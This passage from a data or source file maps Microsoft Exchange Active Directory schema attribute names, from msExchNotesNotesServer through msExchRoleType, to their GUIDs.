        "msExchNotesNotesServer" = "14b51036-b098-11d2-aa06-00c04f8eedd8";
        "msExchNotesPassword" = "593fa28d-2862-11d3-aa68-00c04f8eedd8";
        "msExchNotesRoutableDomains" = "90804554-b09e-11d2-aa06-00c04f8eedd8";
        "msExchNotesRtrMailbox" = "144c28be-b098-11d2-aa06-00c04f8eedd8";
        "msExchNotesSourceBooks" = "12b6d8fa-b098-11d2-aa06-00c04f8eedd8";
        "msExchNotesTargetBook" = "13a07f6e-b098-11d2-aa06-00c04f8eedd8";
        "msExchNotesTargetBooks" = "aad1424c-b093-11d2-aa06-00c04f8eedd8";
        "msExchNotificationAddress" = "381a99ad-0b64-49da-bbbd-522e75bf3183";
        "msExchNotificationEnabled" = "4cc25e51-20b8-4782-97fd-a4c651c06483";
        "msExchNTAccountOptions" = "14ebe64c-b098-11d2-aa06-00c04f8eedd8";
        "msExchNTAuthenticationProviders" = "15278116-b098-11d2-aa06-00c04f8eedd8";
        "msExchNtdsExportContainers" = "155bf4d2-b098-11d2-aa06-00c04f8eedd8";
        "msExchNtdsImportContainer" = "1592cae8-b098-11d2-aa06-00c04f8eedd8";
        "msExchOAB" = "3686cdd4-a982-11d2-a9ff-00c04f8eedd8";
        "msExchOABANRProperties" = "a493670d-4904-41c9-bddb-48fb01e42937";
        "msExchOABDefault" = "15c279f0-b098-11d2-aa06-00c04f8eedd8";
        "msExchOABDetailsProperties" = "f321b41f-2659-46e8-8a54-aee22cdae53f";
        "msExchOABFlags" = "7d2d4473-36bf-4968-9d72-61cbe31d3354";
        "msExchOABFolder" = "15f6edac-b098-11d2-aa06-00c04f8eedd8";
        "msExchOABLastNumberOfRecords" = "de20f063-ec6b-4259-a065-cde2bc895221";
        "msExchOABLastTouchedTime" = "1796eb64-c892-488f-bd80-0083a26c5e91";
        "msExchOABMaxBinarySize" = "841d7095-a986-4516-b028-f29c448277a3";
        "msExchOABMaxMVBinarySize" = "cf9164df-744d-4026-9133-d616b4ce6738";
        "msExchOABMaxMVStringSize" = "c83e0c08-2edf-480b-a015-84a71865fad0";
        "msExchOABMaxStringSize" = "ee473f66-93ca-4cb3-8116-5fb9341d02a9";
        "msExchOABPreferredSite" = "4ed3719d-cebe-4278-88f6-d1b11aac3c11";
        "msExchOABTruncatedProperties" = "cfab920c-0e80-46a0-bc59-3614ab0d6f5d";
        "msExchOABTTL" = "5bdb8e44-730a-4fd9-8411-c982384fd4bb";
        "msExchOABVirtualDirectoriesBL" = "fd9ebee2-c759-4940-b21a-5e25e78f1adc";
        "msExchOABVirtualDirectoriesLink" = "2dcc7ce7-0ea1-4696-9ea5-ba7cbda8203e";
        "msExchOABVirtualDirectory" = "457e0398-cafe-43fb-b128-23c9e9f47c20";
        "msExchObjectCountQuota" = "acae6634-ff87-4a83-9b1e-39016d8f5f4a";
        "msExchObjectID" = "0799800d-e14f-4efc-8f33-36cdf22fb9bb";
        "msExchObjectsDeletedThisPeriod" = "8d84699e-69f7-4341-8c47-8c265cc84b75";
        "msExchOfflineAddressBookBL" = "963985a3-580f-425d-9a5c-fae9aac476ba";
        "msExchOfflineAddressBookLink" = "63c61d8e-342b-4418-85ef-85e61a17d1f3";
        "msExchOmaAdminExtendedSettings" = "e60ae80d-7ac9-4e61-9bc3-98cbc0726a99";
        "msExchOmaAdminWirelessEnable" = "c1a7bfbe-116b-4737-8cd9-d29ef5b3690e";
        "msExchOmaCarrier" = "8712d34c-27e5-41b2-976e-482ad8c954e7";
        "msExchOmaCarrierAddress" = "abe858b8-3daf-407e-b1a6-3a323ed3334b";
        "msExchOmaCarrierType" = "1fb324ad-2da3-4548-8f5a-f34457f8af4a";
        "msExchOmaCarrierUrl" = "aca0878d-89f1-45f5-a48f-680b7e550573";
        "msExchOmaConfiguration" = "d7e12bc7-4288-4866-bc91-f0ee18965c15";
        "msExchOmaConfigurationContainer" = "db0f9abb-0770-4f09-ba64-7993d91517b7";
        "msExchOmaConnector" = "4dc9d0b1-594c-407e-a7d2-426e6c20dabb";
        "msExchOmaContainer" = "863dab20-fb40-43a4-a5e1-825b2071050f";
        "msExchOmaDataSource" = "dda38a4d-972a-44a2-9244-0acb4b1d34d1";
        "msExchOmaDeliverer" = "a231009f-9df2-403d-9fbd-99809049722d";
        "msExchOmaDeliveryProvider" = "cdbf130d-c7e2-4572-94b0-fc9be7eef953";
        "msExchOmaDeliveryProviderDN" = "1f0e1a69-d62c-4105-991d-acaff4b07d71";
        "msExchOmaDeviceCapability" = "df7af4df-f318-4e2c-ac43-be5b4894711c";
        "msExchOmaDeviceCapabilityDN" = "0510bdc4-9b19-4d67-93a1-8dda04c15568";
        "msExchOmaDeviceType" = "ca7a8fb3-21d0-4ea7-af3f-d15c6df7c094";
        "msExchOmaExtendedProperties" = "9ebe537c-f882-473d-980b-ce52202a75d8";
        "msExchOmaFormatter" = "e827cd6a-b63c-4d44-961a-781a67949a36";
        "msExchOmaTranslator" = "d0f2588a-701e-4649-9379-062c62b93ef6";
        "msExchOmaUser" = "36a0a976-dd8d-4aad-81fd-a1b5d4016ca8";
        "msExchOmaValidater" = "a87d0c40-cbbd-4da1-ba2e-704832fca5b1";
        "msExchOnPremiseObjectGuid" = "e9b526e7-c1fc-40ef-b317-db432595cbc9";
        "msExchOrganizationContainer" = "366a319c-a982-11d2-a9ff-00c04f8eedd8";
        "msExchOrganizationFlags" = "b43a9531-c35d-4faf-a98d-42076f724728";
        "msExchOrganizationsAddressBookRootsBL" = "8a235843-7e54-47e9-b021-f24c147769de";
        "msExchOrganizationsAddressBookRootsLink" = "6a3bb211-454f-406a-9f84-a1bc9c8e1d53";
        "msExchOrganizationSettings" = "c59f7641-e479-4ccc-9c2b-51fc9052bb77";
        "msExchOrganizationsGlobalAddressListsBL" = "541007c2-8095-4d22-bbf9-95984909156d";
        "msExchOrganizationsGlobalAddressListsLink" = "a3015299-4eae-4c06-988d-ac7279cb351f";
        "msExchOrganizationsTemplateRootsBL" = "f6806ea3-37a0-4fb9-925a-6efe3c31736e";
        "msExchOrganizationsTemplateRootsLink" = "453e2966-568d-4c1b-98f5-a857f0f0505c";
        "msExchOrganizationSummary" = "8d2eed35-67cb-43c1-a058-6c27317b7b2a";
        "msExchOrgFederatedMailbox" = "ebda4c83-ffa3-46ce-ab32-bc7c0019da9d";
        "msExchOriginatingForest" = "16671de6-9753-47bf-9a12-be31abe0af08";
        "msExchOrigMDB" = "f7b66927-7726-4e66-9ea8-efdf48d65201";
        "msExchOtherAuthenticationFlags" = "b4c7fe67-b523-4d2e-b56e-ac57b686c7e3";
        "msExchOURoot" = "322a6825-980a-4a84-9363-9e042cfc76bd";
        "msExchOverallAgeLimit" = "9162c4ba-b09e-11d2-aa06-00c04f8eedd8";
        "msExchOVVMConnector" = "91ce0e8c-b09e-11d2-aa06-00c04f8eedd8";
        "msExchOWAActionForUnknownFileAndMIMETypes" = "1bdbf957-6e87-4184-8226-3b5926b167ec";
        "msExchOWAAllowedFileTypes" = "dc1a3af6-d61b-464d-9b38-f7e4ff3305b5";
        "msExchOWAAllowedFileTypesBL" = "c817edd8-1fe2-488e-8382-67ee10229d19";
        "msExchOWAAllowedMimeTypes" = "a09a785b-a861-41ab-88fa-4b53a5801eaf";
        "msExchOWAAllowedMimeTypesBL" = "914541b7-b275-4da1-99ee-2755b71f3097";
        "msExchOWABlockedFileTypes" = "9d43751b-71e8-48ee-b888-e430032d1cc3";
        "msExchOWABlockedFileTypesBL" = "552ab6cb-765a-48ee-84f1-b05b4c59542b";
        "msExchOWABlockedMIMETypes" = "fed6213b-bfbf-421a-8a4f-e26dccd38600";
        "msExchOWABlockedMIMETypesBL" = "17d31594-2d19-4c06-abcf-03e733dc9073";
        "msExchOWAClientAuthCleanupLevel" = "3276fdb9-41e9-4761-9efa-b56a1a1789de";
        "msExchOWADefaultClientLanguage" = "7cc453c5-1a08-40dd-9126-8d3447342112";
        "msExchOWADefaultTheme" = "51d0103d-17c8-44dc-90ba-c6f059aab955";
        "msExchOWAExchwebProxyDestination" = "c64ad675-772d-4e7d-b695-438e2314c1f0";
        "msExchOWAFailbackURL" = "ddbe74c8-e7e6-4dbb-99c6-6de3303a622e";
        "msExchOWAFeedbackEnabled" = "79e7e0b6-e09e-46fb-b337-9eeddb403559";
        "msExchOWAFeedbackURL" = "d36a225d-7a48-4c7f-b93d-fa2c7a165246";
        "msExchOWAFileAccessControlOnPrivateComputers" = "3141be44-a4a1-4978-abf1-7b5405130296";
        "msExchOWAFileAccessControlOnPublicComputers" = "deea3f96-696c-4eeb-a131-436e2c90a95f";
        "msExchOWAFilterWebBeacons" = "0a0aa634-25b0-434c-9f9f-b05da790c1c2";
        "msExchOWAForceSaveFileTypes" = "f04a96c7-6972-4cda-89e5-64b1492d9726";
        "msExchOWAForceSaveFileTypesBL" = "290c8f3f-9f37-4391-a433-72da8b129b72";
        "msExchOWAForceSaveMIMETypes" = "08df621e-ccf4-4af1-9a8d-1d84b38b206a";
        "msExchOWAForceSaveMIMETypesBL" = "c4f5fb44-1a87-425f-9ade-421708657507";
        "msExchOWAGzipLevel" = "1cd633b9-8cc9-4e27-a8ee-5fb9efcad476";
        "msExchOWAHelpURL" = "2cab83c2-ce9d-48d2-bbcd-540dde90e1e3";
        "msExchOWAIMCertificateThumbprint" = "305ae68f-b87b-45cc-9618-34fcab97b642";
        "msExchOWAIMProviderType" = "b765c06d-6362-4717-82a2-160d0300a50d";
        "msExchOWAIMServerName" = "84cf8b1e-f45a-4b5b-8c8b-a1e7b113853b";
        "msExchOWALightFeedbackEnabled" = "b5794a6c-9f92-497d-930e-8523ac430429";
        "msExchOWALightFeedbackURL" = "e5936dec-88bd-4a6b-ae67-bd9ec1d56d82";
        "msExchOWALightHelpURL" = "b6de45bc-4201-4480-be0b-685b6ee261bc";
        "msExchOWALogonAndErrorLanguage" = "30a5aa06-6ca7-43e9-83e3-010dc0e1ed13";
        "msExchOWALogonFormat" = "a52f8fc3-bc35-459d-9e9d-870913232c8c";
        "msExchOWAMailboxPolicy" = "1f6c0549-b502-4b25-b352-266ba6c28bff";
        "msExchOWAMaxTranscodableDocSize" = "859266c2-ba62-4dda-825e-a49e7cb04d19";
        "msExchOWANotificationInterval" = "b379264f-3cf7-4205-b7a7-7f3b8af11642";
        "msExchOWAOutboundCharset" = "7b65e689-1d8a-41d0-a5e7-cd32bd8e4244";
        "msExchOWAPolicy" = "4e869218-02b8-4b96-9412-dce863a1954a";
        "msExchOWARedirectToOptimalOWAServer" = "07b010d7-796f-4762-a634-3ca08161d558";
        "msExchOWARemoteDocumentsActionForUnknownServers" = "8afe48fd-7734-46a1-bd66-647767e430e7";
        "msExchOWARemoteDocumentsAllowedServers" = "30ee1024-bf05-4bd3-8560-06caafae0d5e";
        "msExchOWARemoteDocumentsAllowedServersBL" = "8e699dcb-e85f-44ce-b7c7-23dddf2112b8";
        "msExchOWARemoteDocumentsBlockedServers" = "8266e19e-6ff0-4454-938a-deb0abc9296c";
        "msExchOWARemoteDocumentsBlockedServersBL" = "d84ebcac-c887-48df-bfb4-72579f8e51a6";
        "msExchOWARemoteDocumentsInternalDomainSuffixList" = "2d67b69d-d74d-4eb7-a064-cd106c1fa0e5";
        "msExchOWARemoteDocumentsInternalDomainSuffixListBL" = "ee0b1926-6854-437d-8a2b-0dcf80e2663c";
        "msExchOWASettings" = "1b445af2-3730-4bc3-8f4f-80e93fae8ba1";
        "msExchOWAThrottlingPolicyState" = "607acbdb-9310-4c0f-9cf0-4e7950e59eae";
        "msExchOWATranscodingFileTypes" = "7d3aa52c-9668-4cbc-b7ec-b5bf1fa01813";
        "msExchOWATranscodingFileTypesBL" = "6748da87-5bcd-426b-b3a2-85eeea1e1a56";
        "msExchOWATranscodingFlags" = "cb782856-96cf-4e64-8929-feb92dc09f33";
        "msExchOWATranscodingMimeTypes" = "a8794e7e-1597-44bf-aa44-6798be203648";
        "msExchOWATranscodingMimeTypesBL" = "5a5623d2-c12d-443c-aa77-1c8aae389106";
        "msExchOWAUseGB18030" = "91558a96-2954-4a75-86aa-360db3477a49";
        "msExchOWAUseISO885915" = "2f745c32-0caf-4ded-b469-492449037d9c";
        "msExchOWAUserContextTimeout" = "e5a5b2b6-5533-4d81-bbb2-ebe566e4a9bb";
        "msExchOWAVersion" = "b3b3a864-cd0f-44b9-b0ed-44d0e26351ee";
        "msExchOWAVirtualDirectory" = "82281ff7-6780-46a6-ae51-17354e8d93fc";
        "msExchOWAVirtualDirectoryType" = "00c84968-f248-4ac1-8e20-4c7780ae8ea7";
        "msExchOwningOrg" = "16f86ba4-b098-11d2-aa06-00c04f8eedd8";
        "msExchOwningPFTree" = "172a7d06-b098-11d2-aa06-00c04f8eedd8";
        "msExchOwningPFTreeBL" = "175a2c0e-b098-11d2-aa06-00c04f8eedd8";
        "msExchOwningServer" = "17910224-b098-11d2-aa06-00c04f8eedd8";
        "msExchParentPlanBL" = "6f1468ce-2e18-48cc-9faa-95ed6135c2e6";
        "msExchParentPlanLink" = "5d9f88e7-1dfb-413c-bc28-c9848e0593ce";
        "msExchPartnerCP" = "8a0c07b2-b09e-11d2-aa06-00c04f8eedd8";
        "msExchPartnerGroupID" = "3a76cc8b-4729-43e7-bdde-ead7a7e42682";
        "msExchPartnerId" = "8ef36c16-55d8-4b4c-9a86-36da3844cf1e";
        "msExchPartnerLanguage" = "17c7d83a-b098-11d2-aa06-00c04f8eedd8";
        "msExchPassiveInstanceSleepInterval" = "e1495d1c-2aa4-4e58-8ecf-e1e1c6634513";
        "msExchPatchMDB" = "bbdf5f8c-02d5-45ff-bab7-464d5452ebf4";
        "msExchPermittedAuthN" = "146c8019-12ca-421e-b89f-243780da109a";
        "msExchPfCreation" = "ed1161ed-5d1e-4bb3-993f-11956d680ef6";
        "msExchPFDefaultAdminACL" = "3de926b2-22af-11d3-aa62-00c04f8eedd8";
        "msExchPFDSContainer" = "17feae50-b098-11d2-aa06-00c04f8eedd8";
        "msExchPfRootUrl" = "3f50d651-bc97-47b3-aadc-c836d7fec446";
        "msExchPFTree" = "364d9564-a982-11d2-a9ff-00c04f8eedd8";
        "msExchPFTreeType" = "1830bfb2-b098-11d2-aa06-00c04f8eedd8";
        "msExchPhoneticSupport" = "c480f22a-bd3f-4797-8dfc-d6a396058182";
        "msExchPoliciesContainer" = "3630f92c-a982-11d2-a9ff-00c04f8eedd8";
        "msExchPoliciesExcluded" = "61c47258-454e-11d3-aa72-00c04f8eedd8";
        "msExchPoliciesIncluded" = "61c47253-454e-11d3-aa72-00c04f8eedd8";
        "msExchPolicyDefault" = "1865336e-b098-11d2-aa06-00c04f8eedd8";
        "msExchPolicyEnabled" = "e32977dc-1d31-11d3-aa5e-00c04f8eedd8";
        "msExchPolicyLastAppliedTime" = "92407f6c-b09e-11d2-aa06-00c04f8eedd8";
        "msExchPolicyList" = "18cbb88c-b098-11d2-aa06-00c04f8eedd8";
        "msExchPolicyListBL" = "19028ea2-b098-11d2-aa06-00c04f8eedd8";
        "msExchPolicyLockDown" = "1934a004-b098-11d2-aa06-00c04f8eedd8";
        "msExchPolicyOptionList" = "1966b166-b098-11d2-aa06-00c04f8eedd8";
        "msExchPolicyOrder" = "e32977b1-1d31-11d3-aa5e-00c04f8eedd8";
        "msExchPolicyRoots" = "e36ef110-1d40-11d3-aa5e-00c04f8eedd8";
        "msExchPolicyTagLink" = "5b7eae84-7e67-4d56-8fca-9cee24d19a65";
        "msExchPolicyTagLinkBL" = "fcbb7707-d08b-4c1e-8ae6-1bd53e6a7b6b";
        "msExchPollInterval" = "1998c2c8-b098-11d2-aa06-00c04f8eedd8";
        "msExchPOP3Settings" = "afbf135b-2a87-4b5c-9d16-a3ba6a82de78";
        "msExchPopImapBanner" = "5ae90713-da65-4ffd-9d49-bb07c0f91b14";
        "msExchPopImapCalendarItemRetrievalOption" = "97d07c1c-2c62-4e4e-8a13-c91a5b3359a5";
        "msExchPopImapCommandSize" = "e01080d2-4902-40be-afda-89b28e9c54d2";
        "msExchPopImapExtendedProtectionPolicy" = "ce15e1a9-a556-4533-a4cc-dc0329c48d12";
        "msExchPOPIMAPExternalConnectionSettings" = "fe9ef73e-ab5c-451a-8e15-7f7c563dac6b";
        "msExchPopImapFlags" = "8e499338-bf64-4414-b70a-a975f6cc602b";
        "msExchPopImapIncomingPreauthConnectionTimeout" = "6ddee2d2-908e-453b-b28b-5cc39e8f6c9c";
        "msExchPOPIMAPInternalConnectionSettings" = "dd42ccf2-8bac-4cfd-9e34-d8c4f894b730";
        "msExchPopImapLogFilePath" = "fb81bf0b-1210-4526-a93a-1d11c59ba776";
        "msExchPopImapLogFileRolloverFrequency" = "d759587e-0156-498b-ad4b-c89384292b9e";
        "msExchPopImapMaxIncomingConnectionFromSingleSource" = "02e31e1a-c0c9-4699-b8cc-c86bdb879e05";
        "msExchPopImapMaxIncomingConnectionPerUser" = "2d77bb78-4820-4235-99f2-369f4269efdc";
        "msExchPopImapPerLogFileSizeQuota" = "270c5ad1-4f4a-405e-bc57-4e3a5ddb01a8";
        "msExchPopImapProtocolFlags" = "21e52ddc-8289-437f-9eb0-93afa9e104a4";
        "msExchPopImapX509CertificateName" = "2632cd80-7372-490f-bb86-8b12e7feaab3";
        "msExchPOPThrottlingPolicyState" = "3c687efd-b008-4ee8-a308-4476b49325a5";
        "msExchPowershellThrottlingPolicyState" = "1360da88-d32a-42d9-a178-80c618ecff45";
        "msExchPowerShellVirtualDirectory" = "a88e9d98-c724-4c8d-805c-4ab1a85012d6";
        "msExchPreferredBackfillSource" = "5e03e654-d85d-4908-83a1-6141048c5c62";
        "msExchPrevExportDLs" = "48464774-30ca-11d3-aa6d-00c04f8eedd8";
        "msExchPreviousAccountSid" = "9f7f4160-8942-4e87-a3fd-165b7711e433";
        "msExchPreviousHomeMDB" = "538f2e8b-f851-417c-b227-0379dea0ee1c";
        "msExchPreviousMailboxGuid" = "02ea101b-240e-4100-a447-d1fce8036dbf";
        "msExchPrivacyStatementURL" = "0d274759-f127-461b-bfd8-f0081a7d7f22";
        "msExchPrivacyStatementURLEnabled" = "08ba6121-21f8-4183-9c89-439b00bba8c2";
        "msExchPrivateMDB" = "36145cf4-a982-11d2-a9ff-00c04f8eedd8";
        "msExchPrivateMDBPolicy" = "35db2484-a982-11d2-a9ff-00c04f8eedd8";
        "msExchPrivateMDBProxy" = "b8d47e54-4b78-11d3-aa75-00c04f8eedd8";
        "msExchProcessedSids" = "5ab6a4b0-7d6c-4e84-848e-10d52b1eb735";
        "msExchProductID" = "1cbf58a0-5e12-4a78-b8ea-42656df53926";
        "msExchPromptPublishingPoint" = "f563df0e-eb5c-48eb-bb2d-4aa0a2c9496a";
        "msExchProtocolCfgExchangeRPCService" = "ed732f11-d343-436b-8146-d32b5e452f30";
        "msExchProtocolCfgHTTPContainer" = "9432cae6-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgHTTPFilter" = "8c7588c0-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgHTTPFilters" = "8c58ec88-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgHTTPVirtualDirectory" = "8c3c5050-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgIM" = "9f116ea7-284e-11d3-aa68-00c04f8eedd8";
        "msExchProtocolCfgIMAPContainer" = "93da93e4-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgIMAPPolicy" = "35f7c0bc-a982-11d2-a9ff-00c04f8eedd8";
        "msExchProtocolCfgIMAPSessions" = "99f58672-12e8-11d3-aa58-00c04f8eedd8";
        "msExchProtocolCfgIMContainer" = "9f116ea3-284e-11d3-aa68-00c04f8eedd8";
        "msExchProtocolCfgIMVirtualServer" = "9f116eb4-284e-11d3-aa68-00c04f8eedd8";
        "msExchProtocolCfgNNTPContainer" = "94162eae-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgPOPContainer" = "93f99276-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgPOPPolicy" = "35be884c-a982-11d2-a9ff-00c04f8eedd8";
        "msExchProtocolCfgPOPSessions" = "99f58676-12e8-11d3-aa58-00c04f8eedd8";
        "msExchProtocolCfgProtocolContainer" = "90f2b634-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgSharedContainer" = "939ef91a-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgSMTPContainer" = "93bb9552-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgSMTPIPAddress" = "8b7b31d6-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgSMTPIPAddressContainer" = "8b2c843c-b09e-11d2-aa06-00c04f8eedd8";
        "msExchProtocolCfgSMTPPolicy" = "359f89ba-a982-11d2-a9ff-00c04f8eedd8";
        "msExchProvisioningFlags" = "b8fe00a9-8e59-4d4d-8939-85b79de4d8cf";
        "msExchProvisioningPolicy" = "ca98e17d-b310-4d2a-ad9b-6b6221bcd6ba";
        "msExchProvisioningPolicyScopeLinks" = "fb422020-42fe-43d9-9e6e-1377551aa480";
        "msExchProvisioningPolicyTargetObjects" = "b8a49e1c-af92-4153-9127-95660142d1e6";
        "msExchProvisioningPolicyType" = "577362d7-2dc9-442e-b72f-b5f680f6ada6";
        "msExchProxyCustomProxy" = "47bc3aa6-3634-11d3-aa6e-00c04f8eedd8";
        "msExchProxyGenOptions" = "974c9a02-33fc-11d3-aa6e-00c04f8eedd8";
        "msExchProxyGenServer" = "1a2a323a-b098-11d2-aa06-00c04f8eedd8";
        "msExchProxyName" = "1a610850-b098-11d2-aa06-00c04f8eedd8";
        "msExchPseudoPF" = "cec4472b-22ae-11d3-aa62-00c04f8eedd8";
        "msExchPseudoPFAdmin" = "9ae2fa1b-22b0-11d3-aa62-00c04f8eedd8";
        "msExchPublicFolderTreeContainer" = "3582ed82-a982-11d2-a9ff-00c04f8eedd8";
        "msExchPublicMDB" = "3568b3a4-a982-11d2-a9ff-00c04f8eedd8";
        "msExchPublicMDBPolicy" = "354c176c-a982-11d2-a9ff-00c04f8eedd8";
        "msExchPurportedSearchUI" = "1d86e324-b098-11d2-aa06-00c04f8eedd8";
        "msExchQueryBaseDN" = "399eb12c-e120-473c-b0f7-97ae7ca4988b";
        "msExchQueryFilter" = "42730bc3-0a05-4840-8a05-047ef77dabf7";
        "msExchQueryFilterMetadata" = "2fe5b0b2-b383-482c-b0ea-900eaf61e9b2";
        "msExchQueuingMDB" = "8afa72da-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRBACPolicy" = "fa366e2a-6dc4-4931-9d2c-67906572378a";
        "msExchRBACPolicyBL" = "9fae1b8f-cb22-479e-8b27-0936a46393bf";
        "msExchRBACPolicyFlags" = "6a7225f3-5ce1-4a3f-9c29-1bfdcfd0ef70";
        "msExchRBACPolicyLink" = "0f2077c5-8356-4312-9bc3-3ffbea24d9a6";
        "msExchRCAThrottlingPolicyState" = "c31a8b57-41a1-4bd8-869b-056c102d467d";
        "msExchReceiveHashedPassword" = "95ef4000-d163-46db-88b8-48ec44e7963c";
        "msExchReceiveUserName" = "5b1eb3c7-f3bc-4b91-9810-7f1c466886eb";
        "msExchRecipientDisplayType" = "b893abb0-767e-4f20-915f-3857bbc96afe";
        "msExchRecipientEnforcementPolicy" = "f2d5d087-25e1-4b6d-8cc5-ca4a79bf39fc";
        "msExchRecipientFilterFlags" = "6c97e7d7-6f8b-4db8-bbb1-3ff9c6494849";
        "msExchRecipientIssueWarningQuota" = "bcf6f036-ba2d-46d1-9df6-2882450e12e8";
        "msExchRecipientMaxReceiveSize" = "09601903-1a7a-49be-8b24-6129aad57ca3";
        "msExchRecipientMaxSendSize" = "700df71e-f292-4837-b78e-73b6dc24458d";
        "msExchRecipientPolicy" = "e32977d8-1d31-11d3-aa5e-00c04f8eedd8";
        "msExchRecipientPolicyContainer" = "e32977d2-1d31-11d3-aa5e-00c04f8eedd8";
        "msExchRecipientProhibitSendQuota" = "545c0709-1940-4e5e-9f23-841ad5c02f47";
        "msExchRecipientProhibitSendReceiveQuota" = "5444bb33-c242-47ab-91f7-54c849e5520d";
        "msExchRecipientRulesQuota" = "5f9efb88-8cfb-41c7-88bc-53c62f5d3408";
        "msExchRecipientTemplate" = "05377276-3f2a-4c7a-90d6-10da53e84a62";
        "msExchRecipientTemplateFlags" = "4c6f944b-ed87-40b7-b780-c7298bf1d9c9";
        "msExchRecipientTemplatePolicy" = "6e22acae-365c-4eba-aecc-805297a3f4aa";
        "msExchRecipientTypeDetails" = "069ba1f8-540a-42a9-bf26-a7dd35475346";
        "msExchRecipientValidatorCookies" = "a59c6e4e-8416-492a-a0c4-b75cbe17c44a";
        "msExchRecipLimit" = "1dd7f318-b098-11d2-aa06-00c04f8eedd8";
        "msExchRecipTurfListNames" = "2e0a68e1-bdd7-4899-8bb2-d6ea007558c7";
        "msExchRecipTurfListOptions" = "870b36b3-d035-402d-b873-ced07b173763";
        "msExchReconciliationConfig" = "a6fe99a2-d249-4ca0-beed-28444c9bf224";
        "msExchReconciliationCookies" = "4139c104-5e5f-476c-ae93-760c4608596c";
        "msExchRecovery" = "1e007b12-b098-11d2-aa06-00c04f8eedd8";
        "msExchRecoveryPointObjectiveInterADSite" = "2132f3df-1beb-4e2f-a738-5cc406428a15";
        "msExchRecoveryPointObjectiveIntraADSite" = "1d29fe26-e71e-4179-824b-635d5772eea9";
        "msExchRelationTags" = "e63f9034-b4b7-4edf-a585-55f9287a691c";
        "msExchRemotePrivateISList" = "1e29030c-b098-11d2-aa06-00c04f8eedd8";
        "msExchRemoteRecipientType" = "d18490c1-e6df-4140-8d4b-713dc72c18bd";
        "msExchRemoteServerList" = "1e58b214-b098-11d2-aa06-00c04f8eedd8";
        "msExchReplayLag" = "404dbf4c-5a5d-4c52-9131-5b698e29692c";
        "msExchReplicateNow" = "1eac2462-b098-11d2-aa06-00c04f8eedd8";
        "msExchReplicationConnector" = "99f58682-12e8-11d3-aa58-00c04f8eedd8";
        "msExchReplicationConnectorContainer" = "99f5867e-12e8-11d3-aa58-00c04f8eedd8";
        "msExchReplicationMsgSize" = "1ed70eb6-b098-11d2-aa06-00c04f8eedd8";
        "msExchReplicationSchedule" = "1f01f90a-b098-11d2-aa06-00c04f8eedd8";
        "msExchReplicationStyle" = "1f2ce35e-b098-11d2-aa06-00c04f8eedd8";
        "msExchRequireAuthToSendTo" = "f533eb3b-f75b-4fb3-b2fb-08cd537a84d1";
        "msExchReseller" = "c32b3a28-fca5-47ca-aea2-eb43176e4567";
        "msExchResolveP2" = "e24d7aa1-439d-11d3-aa72-00c04f8eedd8";
        "msExchResourceAddressLists" = "6bdf2f2a-d81d-4981-9aa7-c98d10d5731a";
        "msExchResourceCapacity" = "8798118c-2436-4762-be81-892069d725ec";
        "msExchResourceDisplay" = "4516994b-89e4-4fec-ac69-8c2953ef4f00";
        "msExchResourceGUID" = "1f57cdb2-b098-11d2-aa06-00c04f8eedd8";
        "msExchResourceLocationSchema" = "d6c38fa8-1e9c-402d-b33d-46b49e462071";
        "msExchResourceMetaData" = "8daf2c70-36c1-4fcd-b664-7335ddc1aa3c";
        "msExchResourceProperties" = "912beea4-b09e-11d2-aa06-00c04f8eedd8";
        "msExchResourcePropertySchema" = "746197c7-970e-40d2-b193-32baa006005d";
        "msExchResourceSchema" = "ad49d311-957c-43cd-b7cd-d005a868abee";
        "msExchResourceSearchProperties" = "292ee3bd-ab78-460d-9830-7987cceccc2d";
        "msExchResponsibleForSites" = "41850907-48e5-49fc-a3d5-a0fce1e41c10";
        "msExchResponsibleMTAServer" = "9ff15c37-1ec9-11d3-aa5e-00c04f8eedd8";
        "msExchResponsibleMTAServerBL" = "9ff15c3c-1ec9-11d3-aa5e-00c04f8eedd8";
        "msExchRestore" = "a1edcb4c-5c45-4d4a-b128-880392e9dcc6";
        "msExchRetentionComment" = "24adf333-5760-4305-bf70-000ba8d0b286";
        "msExchRetentionPolicyTag" = "c15e748b-5c3d-404b-ac64-8cf846f3ae74";
        "msExchRetentionURL" = "4e0b2680-75f5-48e0-ab7b-c9f5573a2eb5";
        "msExchRMSComputerAccountsBL" = "162176dd-a3c3-48ca-8c07-8ad484f8d30b";
        "msExchRMSComputerAccountsLink" = "50d30fac-b595-420f-8559-c6993b33318a";
        "msExchRMSLicensingLocationUrl" = "20d1e36e-1b1f-4bc9-b576-476e9289fd42";
        "msExchRMSPublishingLocationUrl" = "192c53d9-e3c1-4e68-8d57-9dd2c79e4065";
        "msExchRMSServiceLocationUrl" = "e8c7f53c-2e3e-44de-9e0e-fea484073009";
        "msExchRMSTemplatePath" = "7fdeb080-2491-484d-96d3-e1a21165bc1d";
        "msExchRole" = "1e2f82d7-28c4-479d-9d9f-b9f2e83f726c";
        "msExchRoleAssignment" = "fce12c55-74e8-4227-80e0-7ae4805b4cd2";
        "msExchRoleAssignmentFlags" = "150a62b3-4f05-4ebf-af70-9ef13199f5c4";
        "msExchRoleBL" = "f4f33c76-b170-4844-b795-afc65b56535a";
        "msExchRoleEntries" = "67b3b361-caf7-4ebb-8e3d-9401f5b18404";
        "msExchRoleEntriesExt" = "9e86c077-ce1a-4399-98a3-719c2eafd0e4";
        "msExchRoleFlags" = "14ed4e52-d608-47c0-a456-d76404ef2331";
        "msExchRoleIncludes" = "1f8055ac-b098-11d2-aa06-00c04f8eedd8";
        "msExchRoleLink" = "527e6a9f-5ea3-4c36-b149-c6b921768020";
        "msExchRoleLocalizedNames" = "1fa8dda6-b098-11d2-aa06-00c04f8eedd8";
        "msExchRoleRights" = "1fd165a0-b098-11d2-aa06-00c04f8eedd8";
        "msExchRoleType" = "86a3313c-adc6-415a-8108-6d94f4841798";
